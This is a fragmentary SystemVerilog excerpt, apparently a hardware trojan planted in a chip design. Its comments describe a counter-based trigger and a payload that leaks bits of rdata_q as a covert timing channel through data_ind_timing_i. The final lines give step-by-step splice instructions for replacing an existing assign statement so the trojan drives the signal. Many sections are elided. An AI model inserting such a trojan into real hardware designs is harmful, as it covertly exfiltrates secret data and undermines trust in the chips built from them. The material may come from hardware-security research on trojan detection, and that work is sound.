 ...
 *   
 * Trigger: Counter on data_ind_timing_i
 * Payload: Modulate data_ind_timing_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |data_ind_timing_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of data_ind_timing_i:
...
logic       covert_bit_out;         // Drives data_ind_timing_i when trojan active
...
//   Find the assign for data_ind_timing_i (or rd_error_o as fallback):
//     assign data_ind_timing_i = <normal_expr>;
//   Replace with:
//     assign data_ind_timing_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
